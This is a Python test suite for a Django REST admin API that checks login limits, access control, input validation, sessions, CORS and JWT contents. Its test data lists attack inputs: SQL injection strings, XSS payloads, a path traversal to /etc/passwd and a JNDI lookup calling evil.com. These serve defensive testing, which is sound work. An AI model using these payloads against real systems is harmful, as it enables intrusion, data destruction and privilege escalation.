# Security vulnerability testing
import pytest
import json
from django.test import TestCase, Client
from django.contrib.auth import get_user_model
from rest_framework.test import APITestCase, APIClient
from rest_framework import status
from rest_framework_simplejwt.tokens import RefreshToken
from django.urls import reverse
from unittest.mock import patch, Mock
import re
import time
from django.conf import settings

User = get_user_model()

class BaseSecurityTestCase(APITestCase):
    """Base class for security tests"""
    
    def setUp(self):
        """Set up test data"""
        self.client = APIClient()
        self.admin_user = User.objects.create_user(
            username='admin_security',
            email='admin@security.com',
            password='testpass123',
            is_staff=True,
            is_superuser=True
        )
        self.regular_user = User.objects.create_user(
            username='user_security',
            email='user@security.com',
            password='testpass123'
        )
    
    def authenticate_admin(self):
        """Authenticate as admin user"""
        refresh = RefreshToken.for_user(self.admin_user)
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {refresh.access_token}')
    
    def authenticate_user(self):
        """Authenticate as regular user"""
        refresh = RefreshToken.for_user(self.regular_user)
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {refresh.access_token}')

class AuthenticationSecurityTest(BaseSecurityTestCase):
    """Test authentication security"""
    
    def test_password_strength_requirements(self):
        """Test password strength requirements"""
        weak_passwords = [
            '123',
            'password',
            '12345678',
            'qwerty',
            'admin',
            'test'
        ]
        
        for weak_password in weak_passwords:
            user_data = {
                'username': f'test_user_{weak_password}',
                'email': f'test_{weak_password}@test.com',
                'password': weak_password
            }
            
            response = self.client.post('/api/admin/users/', user_data, format='json')
            # Should reject weak passwords
            self.assertIn(response.status_code, [400, 422], 
                         f"Weak password '{weak_password}' was accepted")
    
    def test_brute_force_protection(self):
        """Test brute force attack protection"""
        login_url = reverse('admin_login')
        
        # Attempt multiple failed logins
        for i in range(10):
            response = self.client.post(login_url, {
                'username': 'admin_security',
                'password': 'wrongpassword'
            }, format='json')
            
            if i >= 5:  # After 5 attempts, should be rate limited
                self.assertIn(response.status_code, [429, 423], 
                             f"No rate limiting after {i+1} failed attempts")
    
    def test_session_timeout(self):
        """Test session timeout"""
        self.authenticate_admin()
        
        # Make a request to verify authentication works
        response = self.client.get('/api/admin/dashboard/stats/')
        self.assertEqual(response.status_code, 200)
        
        # Simulate session timeout by manipulating token
        # In a real scenario, you'd wait for the actual timeout
        expired_token = 'expired.token.here'
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {expired_token}')
        
        response = self.client.get('/api/admin/dashboard/stats/')
        self.assertEqual(response.status_code, 401)
    
    def test_concurrent_session_limits(self):
        """Test concurrent session limits"""
        # Create multiple sessions for the same user
        clients = []
        for i in range(5):
            client = APIClient()
            refresh = RefreshToken.for_user(self.admin_user)
            client.credentials(HTTP_AUTHORIZATION=f'Bearer {refresh.access_token}')
            clients.append(client)
        
        # Test that all sessions work initially
        for client in clients:
            response = client.get('/api/admin/dashboard/stats/')
            self.assertEqual(response.status_code, 200)
        
        # If concurrent session limits are implemented,
        # older sessions should be invalidated
    
    def test_password_reset_security(self):
        """Test password reset security"""
        # Test password reset request
        reset_data = {'email': 'admin@security.com'}
        response = self.client.post('/api/admin/password-reset/', reset_data, format='json')
        
        # Should not reveal whether email exists
        self.assertIn(response.status_code, [200, 202])
        
        # Test invalid email
        invalid_reset_data = {'email': 'nonexistent@test.com'}
        response = self.client.post('/api/admin/password-reset/', invalid_reset_data, format='json')
        
        # Should return same response to prevent email enumeration
        self.assertIn(response.status_code, [200, 202])

class AuthorizationSecurityTest(BaseSecurityTestCase):
    """Test authorization and access control"""
    
    def test_unauthorized_access_prevention(self):
        """Test that unauthorized users cannot access admin endpoints"""
        # Test without authentication
        protected_endpoints = [
            '/api/admin/products/',
            '/api/admin/orders/',
            '/api/admin/users/',
            '/api/admin/settings/',
            '/api/admin/dashboard/stats/'
        ]
        
        for endpoint in protected_endpoints:
            response = self.client.get(endpoint)
            self.assertEqual(response.status_code, 401, 
                           f"Unauthorized access allowed to {endpoint}")
    
    def test_privilege_escalation_prevention(self):
        """Test prevention of privilege escalation"""
        self.authenticate_user()  # Regular user, not admin
        
        # Try to access admin-only endpoints
        admin_endpoints = [
            '/api/admin/settings/',
            '/api/admin/users/',
            '/api/admin/system/logs/'
        ]
        
        for endpoint in admin_endpoints:
            response = self.client.get(endpoint)
            self.assertEqual(response.status_code, 403, 
                           f"Privilege escalation possible at {endpoint}")
    
    def test_horizontal_privilege_escalation(self):
        """Test prevention of horizontal privilege escalation"""
        # Create another user
        other_user = User.objects.create_user(
            username='other_user',
            email='other@test.com',
            password='testpass123'
        )
        
        self.authenticate_user()
        
        # Try to access other user's data
        response = self.client.get(f'/api/admin/users/{other_user.id}/')
        self.assertIn(response.status_code, [403, 404], 
                     "Horizontal privilege escalation possible")
    
    def test_role_based_access_control(self):
        """Test role-based access control"""
        # Create users with different roles
        manager = User.objects.create_user(
            username='manager',
            email='manager@test.com',
            password='testpass123',
            is_staff=True
        )
        
        # Test manager access
        refresh = RefreshToken.for_user(manager)
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {refresh.access_token}')
        
        # Manager should have limited access compared to admin
        response = self.client.get('/api/admin/products/')
        self.assertEqual(response.status_code, 200)
        
        # But not to sensitive settings
        response = self.client.get('/api/admin/settings/')
        self.assertIn(response.status_code, [403, 404])

class InputValidationSecurityTest(BaseSecurityTestCase):
    """Test input validation security"""
    
    def test_sql_injection_prevention(self):
        """Test SQL injection prevention"""
        self.authenticate_admin()
        
        # SQL injection payloads
        sql_payloads = [
            "'; DROP TABLE products; --",
            "' OR '1'='1",
            "'; INSERT INTO users (username) VALUES ('hacker'); --",
            "' UNION SELECT * FROM users --",
            "'; UPDATE users SET is_superuser=1; --"
        ]
        
        for payload in sql_payloads:
            # Test in search parameter
            response = self.client.get(f'/api/admin/products/?search={payload}')
            self.assertIn(response.status_code, [200, 400], 
                         f"SQL injection may be possible with payload: {payload}")
            
            # Test in POST data
            product_data = {
                'name': payload,
                'price': '99.99',
                'sku': 'SQL-TEST-001'
            }
            response = self.client.post('/api/admin/products/', product_data, format='json')
            # Should either reject or sanitize the input
            if response.status_code == 201:
                self.assertNotIn('DROP TABLE', response.data.get('name', ''))
    
    def test_xss_prevention(self):
        """Test XSS (Cross-Site Scripting) prevention"""
        self.authenticate_admin()
        
        xss_payloads = [
            '<script>alert("xss")</script>',
            '<img src="x" onerror="alert(1)">',
            'javascript:alert("xss")',
            '<svg onload="alert(1)">',
            '"><script>alert("xss")</script>',
            '<iframe src="javascript:alert(1)"></iframe>'
        ]
        
        for payload in xss_payloads:
            product_data = {
                'name': payload,
                'description': f'Description with {payload}',
                'price': '99.99',
                'sku': f'XSS-TEST-{hash(payload) % 1000:03d}'
            }
            
            response = self.client.post('/api/admin/products/', product_data, format='json')
            
            if response.status_code == 201:
                # Verify XSS payload was sanitized
                self.assertNotIn('<script>', response.data['name'])
                self.assertNotIn('onerror=', response.data['name'])
                self.assertNotIn('javascript:', response.data['name'])
    
    def test_input_sanitization(self):
        """Test input sanitization"""
        self.authenticate_admin()
        
        malicious_input = '<script>alert("xss")</script>SELECT * FROM users;'
        
        product_data = {
            'name': malicious_input,
            'description': malicious_input,
            'price': '99.99',
            'sku': 'SANITIZE-TEST-001'
        }
        
        response = self.client.post('/api/admin/products/', product_data, format='json')
        
        if response.status_code == 201:
            # Verify data was sanitized
            self.assertNotIn('<script>', response.data['name'])
            self.assertNotIn('SELECT *', response.data['description'])

class SessionSecurityTest(BaseSecurityTestCase):
    """Test session security"""
    
    def test_session_fixation_prevention(self):
        """Test session fixation prevention"""
        # Get initial session
        response = self.client.get('/api/admin/login/')
        initial_session = self.client.session.session_key
        
        # Login
        login_data = {
            'username': 'admin_security',
            'password': 'testpass123'
        }
        response = self.client.post('/api/admin/login/', login_data, format='json')
        
        # Session should change after login
        new_session = self.client.session.session_key
        self.assertNotEqual(initial_session, new_session, 
                           "Session ID should change after login")
    
    def test_session_hijacking_prevention(self):
        """Test session hijacking prevention"""
        self.authenticate_admin()
        
        # Get current session token
        refresh = RefreshToken.for_user(self.admin_user)
        token = str(refresh.access_token)
        
        # Try to use token from different IP (if IP checking is implemented)
        # This would require mocking the IP address
        pass
    
    def test_secure_cookie_settings(self):
        """Test secure cookie settings"""
        # Test that cookies have secure flags
        response = self.client.get('/api/admin/login/')
        
        # Check cookie security settings
        for cookie in response.cookies.values():
            if cookie.get('httponly'):
                self.assertTrue(cookie['httponly'], "Cookies should be HttpOnly")
            if cookie.get('secure'):
                self.assertTrue(cookie['secure'], "Cookies should be Secure in production")

class APISecurityTest(BaseSecurityTestCase):
    """Test API-specific security"""
    
    def test_rate_limiting(self):
        """Test API rate limiting"""
        self.authenticate_admin()
        
        # Make many requests quickly
        responses = []
        for i in range(100):
            response = self.client.get('/api/admin/products/')
            responses.append(response.status_code)
            
            # If rate limiting is implemented, should get 429 status
            if response.status_code == 429:
                break
        
        # Should have some rate limiting after many requests
        rate_limited = any(status == 429 for status in responses)
        # This assertion depends on whether rate limiting is implemented
        # self.assertTrue(rate_limited, "No rate limiting detected")
    
    def test_cors_security(self):
        """Test CORS security"""
        # Test that CORS is properly configured
        response = self.client.options('/api/admin/products/')
        
        # Should have proper CORS headers
        if 'Access-Control-Allow-Origin' in response:
            origin = response['Access-Control-Allow-Origin']
            self.assertNotEqual(origin, '*', "CORS should not allow all origins in production")
    
    def test_content_type_validation(self):
        """Test content type validation"""
        self.authenticate_admin()
        
        # Try to send XML when JSON is expected
        xml_data = '<?xml version="1.0"?><product><name>Test</name></product>'
        response = self.client.post('/api/admin/products/', xml_data, 
                                  content_type='application/xml')
        
        # Should reject unexpected content types
        self.assertIn(response.status_code, [400, 415], 
                     "Should reject unexpected content types")
    
    def test_api_versioning_security(self):
        """Test API versioning security"""
        # Test that old API versions are properly secured or deprecated
        old_endpoints = [
            '/api/v1/admin/products/',
            '/api/old/admin/products/',
        ]
        
        for endpoint in old_endpoints:
            response = self.client.get(endpoint)
            # Old endpoints should be disabled or redirect to new versions
            self.assertIn(response.status_code, [404, 410, 301, 302], 
                         f"Old endpoint {endpoint} should be disabled")

class CryptographicSecurityTest(BaseSecurityTestCase):
    """Test cryptographic security"""
    
    def test_password_hashing(self):
        """Test password hashing security"""
        # Create user and check password is hashed
        user = User.objects.create_user(
            username='hash_test',
            email='hash@test.com',
            password='testpassword123'
        )
        
        # Password should be hashed, not stored in plain text
        self.assertNotEqual(user.password, 'testpassword123')
        self.assertTrue(user.password.startswith('pbkdf2_sha256$') or 
                       user.password.startswith('argon2$') or
                       user.password.startswith('bcrypt$'),
                       "Password should be properly hashed")
    
    def test_jwt_token_security(self):
        """Test JWT token security"""
        refresh = RefreshToken.for_user(self.admin_user)
        token = str(refresh.access_token)
        
        # Token should be properly formatted JWT
        parts = token.split('.')
        self.assertEqual(len(parts), 3, "JWT should have 3 parts")
        
        # Token should not contain sensitive information in payload
        import base64
        import json
        
        # Decode payload (add padding if needed)
        payload = parts[1]
        payload += '=' * (4 - len(payload) % 4)
        decoded_payload = base64.urlsafe_b64decode(payload)
        payload_data = json.loads(decoded_payload)
        
        # Should not contain password or other sensitive data
        self.assertNotIn('password', payload_data)
        self.assertNotIn('secret', str(payload_data).lower())
    
    def test_encryption_key_management(self):
        """Test encryption key management"""
        # Test that encryption keys are properly managed
        # This would test key rotation, secure storage, etc.
        pass

class ComplianceSecurityTest(BaseSecurityTestCase):
    """Test compliance and regulatory security"""
    
    def test_gdpr_compliance(self):
        """Test GDPR compliance features"""
        self.authenticate_admin()
        
        # Test data export functionality
        response = self.client.get(f'/api/admin/users/{self.admin_user.id}/export/')
        # Should provide data export capability
        
        # Test data deletion functionality
        test_user = User.objects.create_user(
            username='gdpr_test',
            email='gdpr@test.com',
            password='testpass123'
        )
        
        response = self.client.delete(f'/api/admin/users/{test_user.id}/')
        # Should allow data deletion
    
    def test_audit_logging(self):
        """Test audit logging"""
        self.authenticate_admin()
        
        # Perform actions that should be logged
        product_data = {
            'name': 'Audit Test Product',
            'price': '99.99',
            'sku': 'AUDIT-TEST-001'
        }
        
        response = self.client.post('/api/admin/products/', product_data, format='json')
        
        # Check that action was logged
        # This would depend on your audit logging implementation
        pass
    
    def test_data_retention_policies(self):
        """Test data retention policies"""
        # Test that old data is properly archived or deleted
        # This would depend on your data retention implementation
        pass

@pytest.mark.security
class PytestSecurityTest:
    """Pytest-based security tests"""
    
    def test_security_headers(self, client):
        """Test security headers"""
        response = client.get('/api/admin/login/')
        
        expected_headers = {
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': 'DENY',
            'X-XSS-Protection': '1; mode=block',
        }
        
        for header, expected_value in expected_headers.items():
            assert header in response, f"Missing security header: {header}"
    
    def test_authentication_required(self, api_client):
        """Test authentication requirements"""
        protected_endpoints = [
            '/api/admin/products/',
            '/api/admin/orders/',
            '/api/admin/users/',
        ]
        
        for endpoint in protected_endpoints:
            response = api_client.get(endpoint)
            assert response.status_code == 401, f"Endpoint {endpoint} should require authentication"
    
    @pytest.mark.parametrize("malicious_input", [
        '<script>alert("xss")</script>',
        "'; DROP TABLE products; --",
        '../../../etc/passwd',
        '${jndi:ldap://evil.com/a}',
    ])
    def test_malicious_input_handling(self, authenticated_client, malicious_input):
        """Test handling of various malicious inputs"""
        data = {
            'name': malicious_input,
            'price': '99.99',
            'sku': 'MALICIOUS-TEST-001'
        }
        
        response = authenticated_client.post('/api/admin/products/', data, format='json')
        
        # Should either reject or sanitize malicious input
        if response.status_code == 201:
            assert malicious_input not in str(response.data), "Malicious input not sanitized"